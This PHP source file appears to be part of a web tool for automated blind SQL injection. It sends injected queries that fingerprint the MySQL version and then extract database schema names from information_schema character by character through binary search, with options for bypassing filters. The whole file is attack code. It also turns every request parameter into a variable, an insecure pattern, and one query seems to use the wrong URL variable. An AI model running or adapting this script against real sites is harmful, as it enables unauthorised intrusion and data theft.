<?php
exit("updating");
	set_time_limit(0);
	require("function_class.php");

	
	//rut gon $_REQUEST["a"] thanh $a 
	foreach($_REQUEST as $key => $value)
	{
		${$key} = $value;
	}
	$url = str_replace("xxx1","&",$url);
	$url = stripcslashes($url);
	$commentBypass = str_replace("xxx2","+--+",$commentBypass);

	$asciiUse = array();

	if($limitChar_0 == 1)
	{
		for($i=97;$i<=122;$i++)
		{
			array_push($asciiUse,$i);
		}
	}
	if($limitChar_1 == 1)
	{
		for($i=65;$i<=90;$i++)
		{
			array_push($asciiUse,$i);
		}
	}
	if($limitChar_2 == 1)
	{
		for($i=48;$i<=57;$i++)
		{
			array_push($asciiUse,$i);
		}
	}
	if($limitChar_3)
	{
		$specialChar = explode(" | ",$limitChar_3);
		foreach($specialChar as $tmp)
		{
			array_push($asciiUse,ord($tmp));
		}
	}

	$select = $select1;
	$arrSecBypass = $arrSecBypass1;


	if($op == 1)
	{
		$info = new CExploit();
		$info->url = $url.$arrSecBypass[$secBypass][0]."%20And%20Substr(Version(),1,1)=4%20".$arrSecBypass[$secBypass][0].$arrCommentBypass[$commentBypass];
		$page = get_page($info->url) or die("time out");
		if(strpos($page,$string))
		{
			exit("version 4 => stop here");
		}
		echo "version 5<br/>List database<br/>";ob_flush();flush();
		$array = array(min($asciiUse),round((max($asciiUse)+min($asciiUse))/2),max($asciiUse));$j=1;$k = 0;
		
		while(1)
		{						
			$info->url = $url."%20".$arrSecBypass[$secBypass][0]."%20AND%20ASCII(SUBSTR((Select%20Schema_Name%20From%20Information_Schema.Schemata%20LIMIT%20".$k.",1),".$j.",1))=0%20".$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass];
			$page=get_page($url);
			if(!strpos($page,$string))
			{
				$info->url = $url."%20".$arrSecBypass[$secBypass][0]."%20AND%20ASCII(SUBSTR((Select%20Schema_Name%20From%20Information_Schema.Schemata%20LIMIT%20".$k.",1),".$j.",1))>".$array[1]."%20".$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass];
				$page=get_page($info->url);
				if(!strpos($page,$string))
				{
					$array[2]=$array[1];
					$array[1]=($array[2]+$array[0])/2;
					if(round($array[1],0)>$array[1])
					{
						$array[1]=round($array[1],0)-1;
					}
					else
					{	
						$array[1]=round($array[1],0);
					}
				}
				else
				{
					$array[0]=$array[1];
					$array[1]=($array[2]+$array[0])/2;
					if(round($array[1],0)>$array[1])
					{
						$array[1]=round($array[1],0)-1;
					}
					else
					{	
						$array[1]=round($array[1],0);
					}
				}
				if(($array[2]-$array[0])==1)
				{
					$info->url = $url."%20".$arrSecBypass[$secBypass][0]."%20AND%20ASCII(SUBSTR((Select%20Schema_Name%20From%20Information_Schema.Schemata%20LIMIT%20".$k.",1),".$j.",1))=".$array[0]."%20".$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass];
					$page=get_page($info->url);
					if(strpos($page,$string))
					{
						echo pack("C*",$array[0]);ob_flush();flush();
						$j++;
						$array = array(min($asciiUse),round((max($asciiUse)+min($asciiUse))/2),max($asciiUse));
						$break = 0;
					}
					else
					{
						$info->url = $url."%20".$arrSecBypass[$secBypass][0]."%20AND%20ASCII(SUBSTR((Select%20Schema_Name%20From%20Information_Schema.Schemata%20LIMIT%20".$k.",1),".$j.",1))=".$array[2]."%20".$arrSecBypass[$secBypass][1].$arrCommentBypass[$commentBypass];
						$page=get_page($info->url);
						if(strpos($page,$string))
						{
							echo pack("C*",$array[2]);ob_flush();flush();
							$j++;
							$array = array(min($asciiUse),round((max($asciiUse)+min($asciiUse))/2),max($asciiUse));
							$break = 0;
						}
						else
						{
							echo "<font color='red'>?</font>";ob_flush();flush();
							$j++;
							$array = array(min($asciiUse),round((max($asciiUse)+min($asciiUse))/2),max($asciiUse));
							$break = 0;
						}
					}
				}		
			}
			elseif(strpos($page,$string))
			{
				echo "<br>";ob_flush();flush();
				$k++;
				$j=1;
				$array = array(min($asciiUse),round((max($asciiUse)+min($asciiUse))/2),max($asciiUse));
				if($break == 1)
				{
					exit("done");
				}
				$break = 1;
			}
		}
	}

?>